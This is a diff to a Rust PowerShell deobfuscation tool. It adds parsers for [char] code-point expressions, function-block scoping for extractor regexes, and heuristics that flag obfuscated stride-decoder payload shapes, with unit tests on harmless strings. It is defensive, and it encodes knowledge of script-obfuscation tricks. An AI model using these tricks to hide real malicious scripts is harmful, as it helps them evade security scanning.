+        idx -= 1;
+        if bytes[idx].is_ascii_whitespace() {
+            continue;
+        }
+        return Some(idx);
+    }
+    None
+}
+
+fn parse_ps_replace_arg(text: &str, start: usize) -> Option<(usize, String)> {
+    let start = skip_ascii_ws(text.as_bytes(), start);
+    if let Some((end, value)) = parse_ps_quoted_literal(text, start) {
+        return Some((end, value));
+    }
+
+    let bytes = text.as_bytes();
+    let mut end = start;
+    let mut depth = 0usize;
+    while end < text.len() {
+        match bytes[end] {
+            b'(' => {
+                depth += 1;
+                end += 1;
+            }
+            b')' if depth > 0 => {
+                depth -= 1;
+                end += 1;
+            }
+            b',' | b')' if depth == 0 => break,
+            _ => end += 1,
+        }
+    }
+    if end <= start {
+        return None;
+    }
+    let expr = text[start..end].trim();
+    let expr = expr
+        .strip_prefix('(')
+        .and_then(|value| value.strip_suffix(')'))
+        .unwrap_or(expr)
+        .trim();
+    let value = eval_ps_char_expression(expr)?;
+    Some((end, value))
+}
+
+fn eval_ps_char_expression(expr: &str) -> Option<String> {
+    if !contains_ascii_case_insensitive(expr, "[char]") {
+        return None;
+    }
+    let mut out = String::new();
+    for cap in CHAR_INNER_RE.captures_iter(expr) {
+        let codepoint = parse_ps_char_codepoint(cap.get(1)?.as_str())?;
+        out.push(char::from_u32(codepoint)?);
+    }
+    (!out.is_empty()).then_some(out)
+}
+
 #[cfg(test)]
 mod ps_dot_replace_prefilter_tests {
     use super::expand_ps_dot_replace;
@@ -2655,6 +3295,24 @@ mod ps_dot_replace_prefilter_tests {
     fn ignores_text_without_dot_replace_shape() {
         let text = "Write-Host 'hello world'";
         assert_eq!(expand_ps_dot_replace(text), text);
+    }
+
+    #[test]
+    fn ignores_empty_dot_replace_pattern() {
+        let text = "'abc'.Replace('', 'X')";
+        assert_eq!(expand_ps_dot_replace(text), text);
+    }
+
+    #[test]
+    fn expands_dot_replace_char_expression_args() {
+        let text = "'A8LUB'.Replace(([CHAR]56+[CHAR]76+[CHAR]85),[string][char]39)";
+        assert_eq!(expand_ps_dot_replace(text), "'A''B'");
+    }
+
+    #[test]
+    fn expands_parenthesized_dot_replace_char_expression_args() {
+        let text = "('A8LUB').Replace(([CHAR]56+[CHAR]76+[CHAR]85),[string][char]39)";
+        assert_eq!(expand_ps_dot_replace(text), "'A''B'");
     }
 }
 
@@ -3225,6 +3883,20 @@ static PS_VAR_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
         r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*)"#,
     )
     .expect("ps var concat assign")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_MIXED_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:(?:\$[A-Za-z_][A-Za-z0-9_]*|'(?:''|[^'])*'|"[^"`$\\]*(?:\\.[^"`$\\]*)*")\s*\+\s*)+(?:\$[A-Za-z_][A-Za-z0-9_]*|'(?:''|[^'])*'|"[^"`$\\]*(?:\\.[^"`$\\]*)*"))"#,
+    )
+    .expect("ps mixed concat assign")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_MIXED_CONCAT_PART_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)|'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)""#)
+        .expect("ps mixed concat part")
 });
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
@@ -4066,6 +4738,225 @@ static LITERAL_CONST_SUBSTRING_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
     )
     .expect("literal constant substring extractor def")
 });
+
+const PS_FUNCTION_BLOCK_MAX_BYTES: usize = 16 * 1024;
+const PS_FUNCTION_BLOCK_MAX_DEFS: usize = 512;
+const PS_FUNCTION_HEADER_MAX_BYTES: usize = 1024;
+
+fn ascii_word_at(bytes: &[u8], pos: usize, word: &[u8]) -> bool {
+    pos + word.len() <= bytes.len()
+        && !is_ident_byte(pos.checked_sub(1).and_then(|idx| bytes.get(idx).copied()))
+        && !is_ident_byte(bytes.get(pos + word.len()).copied())
+        && bytes[pos..pos + word.len()]
+            .iter()
+            .zip(word.iter())
+            .all(|(left, right)| left.eq_ignore_ascii_case(right))
+}
+
+fn is_ps_function_name_start(byte: u8) -> bool {
+    byte.is_ascii_alphabetic() || byte == b'_'
+}
+
+fn is_ps_function_name_rest(byte: u8) -> bool {
+    byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-')
+}
+
+fn parse_ps_function_name(bytes: &[u8], mut pos: usize) -> Option<usize> {
+    if !is_ps_function_name_start(*bytes.get(pos)?) {
+        return None;
+    }
+    pos += 1;
+    while bytes
+        .get(pos)
+        .copied()
+        .is_some_and(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
+    {
+        pos += 1;
+    }
+    if bytes.get(pos) == Some(&b':') {
+        pos += 1;
+        if !is_ps_function_name_start(*bytes.get(pos)?) {
+            return None;
+        }
+        pos += 1;
+    }
+    while bytes
+        .get(pos)
+        .copied()
+        .is_some_and(is_ps_function_name_rest)
+    {
+        pos += 1;
+    }
+    Some(pos)
+}
+
+fn find_ps_function_open_brace(text: &str, mut pos: usize) -> Option<usize> {
+    let bytes = text.as_bytes();
+    let end = pos
+        .saturating_add(PS_FUNCTION_HEADER_MAX_BYTES)
+        .min(bytes.len());
+    while pos < end {
+        match bytes[pos] {
+            b'{' => return Some(pos),
+            b'\'' => {
+                pos += 1;
+                while pos < end {
+                    if bytes[pos] == b'\'' {
+                        if bytes.get(pos + 1) == Some(&b'\'') {
+                            pos += 2;
+                        } else {
+                            pos += 1;
+                            break;
+                        }
+                    } else {
+                        pos += 1;
+                    }
+                }
+            }
+            b'"' => {
+                pos += 1;
+                while pos < end {
+                    if bytes[pos] == b'`' {
+                        pos = (pos + 2).min(end);
+                    } else if bytes[pos] == b'"' {
+                        pos += 1;
+                        break;
+                    } else {
+                        pos += 1;
+                    }
+                }
+            }
+            b'#' => {
+                while pos < end && !matches!(bytes[pos], b'\r' | b'\n') {
+                    pos += 1;
+                }
+            }
+            _ => pos += 1,
+        }
+    }
+    None
+}
+
+fn find_ps_function_block_end(text: &str, open_brace: usize) -> Option<usize> {
+    let bytes = text.as_bytes();
+    let end = open_brace
+        .saturating_add(PS_FUNCTION_BLOCK_MAX_BYTES)
+        .min(bytes.len());
+    let mut pos = open_brace;
+    let mut depth = 0usize;
+    while pos < end {
+        match bytes[pos] {
+            b'{' => {
+                depth = depth.saturating_add(1);
+                pos += 1;
+            }
+            b'}' => {
+                depth = depth.saturating_sub(1);
+                pos += 1;
+                if depth == 0 {
+                    return Some(pos);
+                }
+            }
+            b'\'' => {
+                pos += 1;
+                while pos < end {
+                    if bytes[pos] == b'\'' {
+                        if bytes.get(pos + 1) == Some(&b'\'') {
+                            pos += 2;
+                        } else {
+                            pos += 1;
+                            break;
+                        }
+                    } else {
+                        pos += 1;
+                    }
+                }
+            }
+            b'"' => {
+                pos += 1;
+                while pos < end {
+                    if bytes[pos] == b'`' {
+                        pos = (pos + 2).min(end);
+                    } else if bytes[pos] == b'"' {
+                        pos += 1;
+                        break;
+                    } else {
+                        pos += 1;
+                    }
+                }
+            }
+            b'#' => {
+                while pos < end && !matches!(bytes[pos], b'\r' | b'\n') {
+                    pos += 1;
+                }
+            }
+            _ => pos += 1,
+        }
+    }
+    None
+}
+
+fn scan_ps_function_blocks(text: &str, mut visit: impl FnMut(&str)) {
+    let bytes = text.as_bytes();
+    let mut pos = 0usize;
+    let mut defs = 0usize;
+    while pos < bytes.len() && defs < PS_FUNCTION_BLOCK_MAX_DEFS {
+        match bytes[pos] {
+            b'\'' => {
+                pos += 1;
+                while pos < bytes.len() {
+                    if bytes[pos] == b'\'' {
+                        if bytes.get(pos + 1) == Some(&b'\'') {
+                            pos += 2;
+                        } else {
+                            pos += 1;
+                            break;
+                        }
+                    } else {
+                        pos += 1;
+                    }
+                }
+            }
+            b'"' => {
+                pos += 1;
+                while pos < bytes.len() {
+                    if bytes[pos] == b'`' {
+                        pos = (pos + 2).min(bytes.len());
+                    } else if bytes[pos] == b'"' {
+                        pos += 1;
+                        break;
+                    } else {
+                        pos += 1;
+                    }
+                }
+            }
+            b'#' => {
+                while pos < bytes.len() && !matches!(bytes[pos], b'\r' | b'\n') {
+                    pos += 1;
+                }
+            }
+            _ if ascii_word_at(bytes, pos, b"function") => {
+                let name_start = skip_ascii_ws(bytes, pos + "function".len());
+                let Some(name_end) = parse_ps_function_name(bytes, name_start) else {
+                    pos += "function".len();
+                    continue;
+                };
+                let Some(open_brace) = find_ps_function_open_brace(text, name_end) else {
+                    pos = name_end;
+                    continue;
+                };
+                let Some(block_end) = find_ps_function_block_end(text, open_brace) else {
+                    pos = open_brace + 1;
+                    continue;
+                };
+                defs += 1;
+                visit(&text[pos..block_end]);
+                pos = block_end;
+            }
+            _ => pos += 1,
+        }
+    }
+}
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
 static LITERAL_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
@@ -5211,40 +6102,45 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
     {
         return text.to_string();
     }
-    let defs: Vec<(
+    let mut defs: Vec<(
         String,
         PsLiteralArgBinding,
         PsLiteralArgBinding,
         PsLiteralArgBinding,
-    )> = LITERAL_REPLACE_EXTRACTOR_DEF_RE
-        .captures_iter(text)
-        .chain(LITERAL_DOT_REPLACE_EXTRACTOR_DEF_RE.captures_iter(text))
-        .filter_map(|caps| {
-            let name = caps.get(1)?.as_str();
-            let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-            Some((
-                name.to_string(),
-                ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
-                ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
-            ))
-        })
-        .collect();
-    let const_defs: Vec<(String, PsLiteralArgBinding, String, String)> =
-        LITERAL_CONST_DOT_REPLACE_EXTRACTOR_DEF_RE
-            .captures_iter(text)
-            .chain(LITERAL_CONST_DASH_REPLACE_EXTRACTOR_DEF_RE.captures_iter(text))
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str();
-                let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-                Some((
-                    name.to_string(),
-                    ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    caps.get(4)?.as_str().replace("''", "'"),
-                    caps.get(5)?.as_str().replace("''", "'"),
-                ))
-            })
-            .collect();
+    )> = Vec::new();
+    let mut const_defs: Vec<(String, PsLiteralArgBinding, String, String)> = Vec::new();
+    scan_ps_function_blocks(text, |block| {
+        defs.extend(
+            LITERAL_REPLACE_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .chain(LITERAL_DOT_REPLACE_EXTRACTOR_DEF_RE.captures_iter(block))
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
+                    ))
+                }),
+        );
+        const_defs.extend(
+            LITERAL_CONST_DOT_REPLACE_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .chain(LITERAL_CONST_DASH_REPLACE_EXTRACTOR_DEF_RE.captures_iter(block))
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        caps.get(4)?.as_str().replace("''", "'"),
+                        caps.get(5)?.as_str().replace("''", "'"),
+                    ))
+                }),
+        );
+    });
     if defs.is_empty() && const_defs.is_empty() {
         return text.to_string();
     }
@@ -5277,51 +6173,60 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
     {
         return text.to_string();
     }
-    let defs: Vec<(
+    let mut defs: Vec<(
         String,
         PsLiteralArgBinding,
         PsLiteralArgBinding,
         PsLiteralArgBinding,
-    )> = LITERAL_SUBSTRING_EXTRACTOR_DEF_RE
-        .captures_iter(text)
-        .filter_map(|caps| {
-            let name = caps.get(1)?.as_str();
-            let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-            Some((
-                name.to_string(),
-                ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
-                ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
-            ))
-        })
-        .collect();
-    let tail_defs: Vec<(String, PsLiteralArgBinding, PsLiteralArgBinding)> =
-        LITERAL_TAIL_SUBSTRING_EXTRACTOR_DEF_RE
-            .captures_iter(text)
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str();
-                let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-                Some((
-                    name.to_string(),
-                    ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
-                ))
-            })
-            .collect();
-    let const_defs: Vec<(String, PsLiteralArgBinding, usize, usize)> =
-        LITERAL_CONST_SUBSTRING_EXTRACTOR_DEF_RE
-            .captures_iter(text)
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str();
-                let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-                Some((
-                    name.to_string(),
-                    ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    caps.get(4)?.as_str().parse().ok()?,
-                    caps.get(5)?.as_str().parse().ok()?,
-                ))
-            })
-            .collect();
+    )> = Vec::new();
+    let mut tail_defs: Vec<(String, PsLiteralArgBinding, PsLiteralArgBinding)> = Vec::new();
+    let mut const_defs: Vec<(String, PsLiteralArgBinding, usize, usize)> = Vec::new();
+    scan_ps_function_blocks(text, |window| {
+        defs.extend(
+            LITERAL_SUBSTRING_EXTRACTOR_DEF_RE
+                .captures_iter(window)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
+                    ))
+                }),
+        );
+        tail_defs.extend(
+            LITERAL_TAIL_SUBSTRING_EXTRACTOR_DEF_RE
+                .captures_iter(window)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
+                    ))
+                }),
+        );
+        const_defs.extend(
+            LITERAL_CONST_SUBSTRING_EXTRACTOR_DEF_RE
+                .captures_iter(window)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        caps.get(4)?.as_str().parse().ok()?,
+                        caps.get(5)?.as_str().parse().ok()?,
+                    ))
+                }),
+        );
+    });
+    if defs.is_empty() && tail_defs.is_empty() && const_defs.is_empty() {
+        return text.to_string();
+    }
     let mut out = text.to_string();
     for (name, value_binding, start_binding, count_binding) in defs {
         out = inline_ps_literal_substring_extractor_calls(
@@ -5358,11 +6263,42 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
     {
         return text.to_string();
     }
-    let defs: Vec<(String, PsLiteralArgBinding, PsLiteralArgBinding, PsTrimMode)> =
-        LITERAL_TRIM_EXTRACTOR_DEF_RE
+    let mut defs: Vec<(String, PsLiteralArgBinding, PsLiteralArgBinding, PsTrimMode)> = Vec::new();
+    let mut const_defs: Vec<(String, PsLiteralArgBinding, String, PsTrimMode)> = Vec::new();
+    scan_ps_function_blocks(text, |block| {
+        defs.extend(
+            LITERAL_TRIM_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .chain(LITERAL_PARAM_BLOCK_TRIM_EXTRACTOR_DEF_RE.captures_iter(block))
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
+                        PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
+                    ))
+                }),
+        );
+        const_defs.extend(
+            LITERAL_CONST_TRIM_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        caps.get(5)?.as_str().replace("''", "'"),
+                        PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
+                    ))
+                }),
+        );
+    });
+    defs.extend(
+        LITERAL_ITEM_PATH_TRIM_EXTRACTOR_DEF_RE
             .captures_iter(text)
-            .chain(LITERAL_PARAM_BLOCK_TRIM_EXTRACTOR_DEF_RE.captures_iter(text))
-            .chain(LITERAL_ITEM_PATH_TRIM_EXTRACTOR_DEF_RE.captures_iter(text))
             .chain(LITERAL_ITEM_NAME_TRIM_EXTRACTOR_DEF_RE.captures_iter(text))
             .filter_map(|caps| {
                 let name = caps.get(1)?.as_str();
@@ -5373,22 +6309,8 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
                     ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
                     PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
                 ))
-            })
-            .collect();
-    let const_defs: Vec<(String, PsLiteralArgBinding, String, PsTrimMode)> =
-        LITERAL_CONST_TRIM_EXTRACTOR_DEF_RE
-            .captures_iter(text)
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str();
-                let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-                Some((
-                    name.to_string(),
-                    ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    caps.get(5)?.as_str().replace("''", "'"),
-                    PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
-                ))
-            })
-            .collect();
+            }),
+    );
     let mut out = text.to_string();
     for (name, value_binding, chars_binding, mode) in defs {
         out = inline_ps_literal_trim_extractor_calls(
@@ -5413,22 +6335,26 @@ fn expand_literal_case_extractor_calls(text: &str) -> String {
     {
         return text.to_string();
     }
-    let defs: Vec<(String, usize, bool)> = LITERAL_CASE_EXTRACTOR_DEF_RE
-        .captures_iter(text)
-        .filter_map(|caps| {
-            let name = caps.get(1)?.as_str();
-            let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-            let value_param = caps.get(3)?.as_str();
-            let value_position = params
-                .iter()
-                .position(|param| param.eq_ignore_ascii_case(value_param))?;
-            Some((
-                name.to_string(),
-                value_position,
-                caps.get(4)?.as_str().eq_ignore_ascii_case("Lower"),
-            ))
-        })
-        .collect();
+    let mut defs: Vec<(String, usize, bool)> = Vec::new();
+    scan_ps_function_blocks(text, |block| {
+        defs.extend(
+            LITERAL_CASE_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    let value_param = caps.get(3)?.as_str();
+                    let value_position = params
+                        .iter()
+                        .position(|param| param.eq_ignore_ascii_case(value_param))?;
+                    Some((
+                        name.to_string(),
+                        value_position,
+                        caps.get(4)?.as_str().eq_ignore_ascii_case("Lower"),
+                    ))
+                }),
+        );
+    });
     let mut out = text.to_string();
     for (name, value_position, lower) in defs {
         out = inline_ps_literal_case_extractor_calls(&out, &name, value_position, lower);
@@ -5477,47 +6403,52 @@ fn expand_literal_index_extractor_calls(text: &str) -> String {
     {
         return text.to_string();
     }
-    let defs: Vec<(String, usize, usize)> = LITERAL_INDEX_EXTRACTOR_DEF_RE
-        .captures_iter(text)
-        .filter_map(|caps| {
-            let name = caps.get(1)?.as_str();
-            let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-            let value_param = caps.get(3)?.as_str().to_ascii_lowercase();
-            let index_param = caps
-                .get(4)
-                .or_else(|| caps.get(5))
-                .or_else(|| caps.get(6))?
-                .as_str()
-                .to_ascii_lowercase();
-            let value_position = params
-                .iter()
-                .position(|param| param.eq_ignore_ascii_case(&value_param))?;
-            let index_position = params
-                .iter()
-                .position(|param| param.eq_ignore_ascii_case(&index_param))?;
-            Some((name.to_string(), value_position, index_position))
-        })
-        .collect();
-    let const_defs: Vec<(String, PsLiteralArgBinding, usize)> =
-        LITERAL_CONST_INDEX_EXTRACTOR_DEF_RE
-            .captures_iter(text)
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str();
-                let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-                let index = caps
-                    .get(4)
-                    .or_else(|| caps.get(5))
-                    .or_else(|| caps.get(6))?
-                    .as_str()
-                    .parse()
-                    .ok()?;
-                Some((
-                    name.to_string(),
-                    ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    index,
-                ))
-            })
-            .collect();
+    let mut defs: Vec<(String, usize, usize)> = Vec::new();
+    let mut const_defs: Vec<(String, PsLiteralArgBinding, usize)> = Vec::new();
+    scan_ps_function_blocks(text, |block| {
+        defs.extend(
+            LITERAL_INDEX_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    let value_param = caps.get(3)?.as_str().to_ascii_lowercase();
+                    let index_param = caps
+                        .get(4)
+                        .or_else(|| caps.get(5))
+                        .or_else(|| caps.get(6))?
+                        .as_str()
+                        .to_ascii_lowercase();
+                    let value_position = params
+                        .iter()
+                        .position(|param| param.eq_ignore_ascii_case(&value_param))?;
+                    let index_position = params
+                        .iter()
+                        .position(|param| param.eq_ignore_ascii_case(&index_param))?;
+                    Some((name.to_string(), value_position, index_position))
+                }),
+        );
+        const_defs.extend(
+            LITERAL_CONST_INDEX_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    let index = caps
+                        .get(4)
+                        .or_else(|| caps.get(5))
+                        .or_else(|| caps.get(6))?
+                        .as_str()
+                        .parse()
+                        .ok()?;
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        index,
+                    ))
+                }),
+        );
+    });
     let mut out = text.to_string();
     for (name, value_position, index_position) in defs {
         out = inline_ps_literal_index_extractor_calls(&out, &name, value_position, index_position);
@@ -5534,39 +6465,44 @@ fn expand_literal_remove_extractor_calls(text: &str) -> String {
     {
         return text.to_string();
     }
-    let variable_defs: Vec<(
+    let mut variable_defs: Vec<(
         String,
         PsLiteralArgBinding,
         PsLiteralArgBinding,
         Option<PsLiteralArgBinding>,
-    )> = LITERAL_REMOVE_EXTRACTOR_DEF_RE
-        .captures_iter(text)
-        .filter_map(|caps| {
-            let name = caps.get(1)?.as_str();
-            let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-            Some((
-                name.to_string(),
-                ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
-                caps.get(5)
-                    .and_then(|m| ps_literal_arg_binding(&params, m.as_str())),
-            ))
-        })
-        .collect();
-    let defs: Vec<(String, PsLiteralArgBinding, usize, usize)> =
-        LITERAL_CONST_REMOVE_EXTRACTOR_DEF_RE
-            .captures_iter(text)
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str();
-                let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-                Some((
-                    name.to_string(),
-                    ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    caps.get(4)?.as_str().parse().ok()?,
-                    caps.get(5)?.as_str().parse().ok()?,
-                ))
-            })
-            .collect();
+    )> = Vec::new();
+    let mut defs: Vec<(String, PsLiteralArgBinding, usize, usize)> = Vec::new();
+    scan_ps_function_blocks(text, |block| {
+        variable_defs.extend(
+            LITERAL_REMOVE_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
+                        caps.get(5)
+                            .and_then(|m| ps_literal_arg_binding(&params, m.as_str())),
+                    ))
+                }),
+        );
+        defs.extend(
+            LITERAL_CONST_REMOVE_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        caps.get(4)?.as_str().parse().ok()?,
+                        caps.get(5)?.as_str().parse().ok()?,
+                    ))
+                }),
+        );
+    });
     let mut out = text.to_string();
     for (name, value_binding, start_binding, count_binding) in variable_defs {
         out = inline_ps_literal_remove_extractor_calls(
@@ -5595,38 +6531,43 @@ fn expand_literal_insert_extractor_calls(text: &str) -> String {
     {
         return text.to_string();
     }
-    let variable_defs: Vec<(
+    let mut variable_defs: Vec<(
         String,
         PsLiteralArgBinding,
         PsLiteralArgBinding,
         PsLiteralArgBinding,
-    )> = LITERAL_INSERT_EXTRACTOR_DEF_RE
-        .captures_iter(text)
-        .filter_map(|caps| {
-            let name = caps.get(1)?.as_str();
-            let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-            Some((
-                name.to_string(),
-                ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
-                ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
-            ))
-        })
-        .collect();
-    let defs: Vec<(String, PsLiteralArgBinding, usize, String)> =
-        LITERAL_CONST_INSERT_EXTRACTOR_DEF_RE
-            .captures_iter(text)
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str();
-                let params = parse_ps_parameter_names(caps.get(2)?.as_str());
-                Some((
-                    name.to_string(),
-                    ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    caps.get(4)?.as_str().parse().ok()?,
-                    caps.get(5)?.as_str().replace("''", "'"),
-                ))
-            })
-            .collect();
+    )> = Vec::new();
+    let mut defs: Vec<(String, PsLiteralArgBinding, usize, String)> = Vec::new();
+    scan_ps_function_blocks(text, |block| {
+        variable_defs.extend(
+            LITERAL_INSERT_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
+                        ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
+                    ))
+                }),
+        );
+        defs.extend(
+            LITERAL_CONST_INSERT_EXTRACTOR_DEF_RE
+                .captures_iter(block)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str();
+                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
+                    Some((
+                        name.to_string(),
+                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
+                        caps.get(4)?.as_str().parse().ok()?,
+                        caps.get(5)?.as_str().replace("''", "'"),
+                    ))
+                }),
+        );
+    });
     let mut out = text.to_string();
     for (name, value_binding, start_binding, insert_binding) in variable_defs {
         out = inline_ps_literal_insert_extractor_calls(
@@ -5965,6 +6906,36 @@ fn contains_skip_nth_for_substring_shape(text: &str) -> bool {
         || contains_ascii_case_insensitive(text, "while")
 }
 
+fn looks_like_dense_skip_nth_payload(text: &str) -> bool {
+    if text.len() < 1024 || !has_stride_decoder_definition_atom(text) {
+        return false;
+    }
+    let lower = text.to_ascii_lowercase();
+    (lower.contains("do{") || lower.contains("do {"))
+        && lower.contains("until")
+        && lower.contains("+=")
+        && lower.matches(");").count() >= 8
+}
+
+fn looks_like_for_substring_stride_payload(text: &str) -> bool {
+    if text.len() < 1024 || !has_stride_decoder_definition_atom(text) {
+        return false;
+    }
+    let has_for_stride_loop = contains_ascii_case_insensitive(text, "for(")
+        || contains_ascii_case_insensitive(text, "for (");
+    if !has_for_stride_loop || !contains_ascii_case_insensitive(text, "+=") {
+        return false;
+    }
+    contains_ascii_case_insensitive(text, "invoke")
+        || (text.contains("[$") && FOR_INDEX_STRIDE_DEF_RE.is_match(text))
+}
+
+fn has_stride_decoder_definition_atom(text: &str) -> bool {
+    contains_ascii_case_insensitive(text, "function")
+        || contains_ascii_case_insensitive(text, "-n ")
+        || contains_ascii_case_insensitive(text, "-name ")
+}
+
 fn expand_skip_nth(text: &str) -> String {
     if !contains_ascii_case_insensitive(text, "function")
